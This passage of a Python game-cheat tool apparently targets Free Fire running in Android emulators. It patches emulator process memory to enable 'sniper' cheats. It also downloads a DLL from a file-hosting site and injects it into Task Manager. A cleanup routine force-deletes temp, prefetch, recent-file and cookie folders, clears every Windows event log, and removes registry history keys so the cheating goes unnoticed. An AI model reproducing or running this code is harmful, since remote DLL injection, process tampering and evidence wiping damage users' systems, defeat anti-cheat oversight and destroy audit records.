                    pattern_data['original_values'].append((addr, original_value))
                    print(f"Replacing value at {hex(addr)} with {replacement_bytes.hex()}")
                    write_bytes(proc.process_handle, addr, replacement_bytes, len(replacement_bytes))
                    print(f"Activated {pattern_data['name']} at {hex(addr)}")
                print(f"Completed activation for {pattern_data['name']}")
            
            end_time = time.time()
            execution_time = end_time - start_time
            print(f"Activation process completed at {time.ctime(end_time)} in {execution_time:.3f} seconds")
            return "All sniper switches activated successfully"
        else:
            print("No process handle available")
            return "Failed to activate sniper switches: No process"
    except pymem.exception.ProcessNotFound:
        print("HD-Player not running")
        return "HD-Player not running"
    except Exception as e:
        print(f"Error in ACTIVATELOADEDSWITCH: {e}")
        return f"Error: {e}"
    finally:
        if proc:
            proc.close_process()

def REMOVELOADEDSWITCH():
    try:
        proc = Pymem("HD-Player")
        
        if proc:
            print("Deactivating sniper switches...")
            for pattern_data in sniper_switch_patterns:
                if not pattern_data['original_values']:
                    print(f"Skipping {pattern_data['name']}: No original values to restore")
                    continue
                for addr, original_val in pattern_data['original_values']:
                    write_bytes(proc.process_handle, addr, original_val, len(original_val))
                print(f"Restored {pattern_data['name']}")
            return "All sniper switches deactivated successfully"
        else:
            print("No process handle available")
            return "Failed to deactivate sniper switches: No process"
    except pymem.exception.ProcessNotFound:
        print("HD-Player not running")
        return "HD-Player not running"
    except Exception as e:
        print(f"Error in REMOVELOADEDSWITCH: {e}")



def Load_all():
    SNIPERSCOPELOAD()
    SNIPERSWITCHLOAD()
    return "Sniper Functions Loaded"





def Sniper_scope_on():
    ACTIVATELOADEDSCOPE()
    return "Sniper Scope Activated"


def Sniper_scope_off():
    REMOVELOADEDSCOPE()
    return "Sniper Scope Deactivated"

def Sniper_switch_on():
    ACTIVATELOADEDSWITCH()
    return "Sniper Switch Activated"

def Sniper_switch_off():
    REMOVELOADEDSWITCH()
    return "Sniper Switch Deactivated"




def taskmanager():
    process_id = None
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == "Taskmgr.exe":
            process_id = proc.info['pid']
            break
    if not process_id:
        return 'Process not found'
    dll_path = r"C:\Windows\p6uc8t.dll"
    dll_url = "https://files.catbox.moe/p6uc8t.dll"
    if not os.path.isfile(dll_path):
        if not download_dll(dll_url, dll_path):
            return 'Failed to download DLL'
    result = inject_dll(process_id, dll_path)
    if result:
        return 'success'
    return 'Bypas Task Manager successfully'










def block_internet():
    commands = [
        'netsh advfirewall firewall add rule name="FF Block In1" dir=in action=block program="%ProgramFiles%\\BlueStacks_nxt\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In1" dir=out action=block program="%ProgramFiles%\\BlueStacks_nxt\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In2" dir=in action=block program="%ProgramFiles%\\BlueStacks\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In2" dir=out action=block program="%ProgramFiles%\\BlueStacks\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In3" dir=in action=block program="%ProgramFiles%\\BlueStacks_msi2\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In3" dir=out action=block program="%ProgramFiles%\\BlueStacks_msi2\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In6" dir=in action=block program="%ProgramFiles%\\BlueStacks_msi5\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In6" dir=out action=block program="%ProgramFiles%\\BlueStacks_msi5\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In4" dir=in action=block program="%ProgramData%\\BlueStacks_msi5\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In4" dir=out action=block program="%ProgramData%\\BlueStacks_msi5\\HD-Player.exe"',
        'netsh advfirewall firewall add rule name="FF Block In5" dir=in action=block program="%ProgramFiles(x86)%\\SmartGaGa\\ProjectTitan\\Engine\\ProjectTitan.exe"',
        'netsh advfirewall firewall add rule name="FF Block In5" dir=out action=block program="%ProgramFiles(x86)%\\SmartGaGa\\ProjectTitan\\Engine\\ProjectTitan.exe"',
    ]

    for command in commands:
        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    return('Emulator Network Blocked.')

def unblock_internet():
    # List of commands to unblock internet access for the specified programs
    commands = [
        'netsh advfirewall firewall delete rule name="FF Block In1" program="%ProgramFiles%\\BlueStacks_nxt\\HD-Player.exe"',
        'netsh advfirewall firewall delete rule name="FF Block In2" program="%ProgramFiles%\\BlueStacks\\HD-Player.exe"',
        'netsh advfirewall firewall delete rule name="FF Block In3" program="%ProgramFiles%\\BlueStacks_msi2\\HD-Player.exe"',
        'netsh advfirewall firewall delete rule name="FF Block In6" program="%ProgramFiles%\\BlueStacks_msi5\\HD-Player.exe"',
        'netsh advfirewall firewall delete rule name="FF Block In4" program="%ProgramData%\\BlueStacks_msi5\\HD-Player.exe"',
        'netsh advfirewall firewall delete rule name="FF Block In5" program="%ProgramFiles(x86)%\\SmartGaGa\\ProjectTitan\\Engine\\ProjectTitan.exe"',
    ]

    for command in commands:
        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    return('Emulator Network Unblocked.')

def run_command(command):
    """Helper function to run a system command."""
    try:
        subprocess.run(command, check=True, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        
def full_cleanup():
    commands = [
        "del /s /f /q %windir%\\temp\\*.*",
        "rd /s /q %windir%\\temp",
        "md %windir%\\temp",
        "del /s /f /q %windir%\\Prefetch\\*.*",
        "rd /s /q %windir%\\Prefetch",
        "md %windir%\\Prefetch",
        "del /s /f /q %windir%\\system32\\dllcache\\*.*",
        "rd /s /q %windir%\\system32\\dllcache",
        "md %windir%\\system32\\dllcache",
        "del /s /f /q \"%SystemDrive%\\Temp\\*.*\"",
        "rd /s /q \"%SystemDrive%\\Temp\"",
        "md \"%SystemDrive%\\Temp\"",
        "del /s /f /q %temp%\\*.*",
        "rd /s /q %temp%",
        "md %temp%",
        "del /s /f /q \"%USERPROFILE%\\Local Settings\\History\\*.*\"",
        "rd /s /q \"%USERPROFILE%\\Local Settings\\History\"",
        "md \"%USERPROFILE%\\Local Settings\\History\"",
        "del /s /f /q \"%USERPROFILE%\\Local Settings\\Temporary Internet Files\\*.*\"",
        "rd /s /q \"%USERPROFILE%\\Local Settings\\Temporary Internet Files\"",
        "md \"%USERPROFILE%\\Local Settings\\Temporary Internet Files\"",
        "del /s /f /q \"%USERPROFILE%\\Local Settings\\Temp\\*.*\"",
        "rd /s /q \"%USERPROFILE%\\Local Settings\\Temp\"",
        "md \"%USERPROFILE%\\Local Settings\\Temp\"",
        "del /s /f /q \"%USERPROFILE%\\Recent\\*.*\"",
        "rd /s /q \"%USERPROFILE%\\Recent\"",
        "md \"%USERPROFILE%\\Recent\"",
        "del /s /f /q \"%USERPROFILE%\\Cookies\\*.*\"",
        "rd /s /q \"%USERPROFILE%\\Cookies\"",
        "md \"%USERPROFILE%\\Cookies\"",
        "cls"
    ]
    for command in commands:
        run_command(command)
    try:
        result = subprocess.run("bcdedit", capture_output=True, text=True, shell=True)
        admin_check = result.stdout.splitlines()
        admin_status = any("Access" in line for line in admin_check)

        if not admin_status:
            print("You must run this script as an Administrator!")
            return
        
    except Exception as e:
        print(f"Error checking admin status: {e}")
        return
    try:
        event_logs = subprocess.run("wevtutil.exe el", capture_output=True, text=True, shell=True)
        for log in event_logs.stdout.splitlines():
            subprocess.run(f"wevtutil.exe cl {log}", shell=True)
        print("\nEvent Logs have been cleared!")
    except Exception as e:
        print(f"Error clearing event logs: {e}")
    registry_keys = [
        r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Clients\StartMenuInternet",
        r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\dll",
        r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts.dll\OpenWithList",
        r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
        r"HKEY_USERS\%usersid%\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
        r"HKEY_USERS\%usersid%\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\dll"
    ]
    appdata_path = os.getenv("APPDATA")
    files_to_delete = [
        os.path.join(appdata_path, "Microsoft\\Windows\\Recent\\*.*"),
        os.path.join(appdata_path, "Microsoft\\Windows\\Recent\\CustomDestinations\\*.*"),
        os.path.join(appdata_path, "Microsoft\\Windows\\Recent\\AutomaticDestinations\\*.*"),
        os.path.join(os.getenv("SYSTEMROOT"), "appcompat\\Programs\\*.txt"),
        os.path.join(os.getenv("SYSTEMROOT"), "appcompat\\Programs\\*.xml"),
        os.path.join(os.getenv("SYSTEMROOT"), "Prefetch\\*.*"),
        os.path.join(os.getenv("SYSTEMROOT"), "Minidump\\*.*")
    ]
    for key in registry_keys:
        try:
            subprocess.run(f'reg delete "{key}" /f', check=True)
        except subprocess.CalledProcessError:
            print(f"Failed to delete registry key: {key}")
    for file_path in files_to_delete:
        try:
            for file in glob.glob(file_path):
                os.remove(file)
        except Exception as e:
            print(f"Failed to delete file: {file_path} - {e}")
            return 'Failed BYPASS'

    return('PC BYPASS SUCCESSFUL')











def clear():
    if platform.system() == 'Windows':
        os.system('cls & title Python Example')
    elif platform.system() == 'Linux':
        os.system('clear')
        sys.stdout.write("\x1b]0;Python Example\x07")
    # elif platform.system() == 'Darwin':
    #     os.system("clear && printf '\e[3J'")
    #     os.system('''echo - n - e "\033]0;Python Example\007"''')

def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest



# if sys.platform == "win32":
#     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# def taskmanagerloop():
#     while True:
#         taskmanager()
#         print("Taskmanager is running...")
#         time.sleep(2)  # Wait for 2 seconds

# def run_taskmanager():
#     # Running taskmanagerloop in a separate thread
#     task_thread = threading.Thread(target=taskmanagerloop)
#     task_thread.daemon = True  # Allows thread to exit when the main program exits
#     task_thread.start()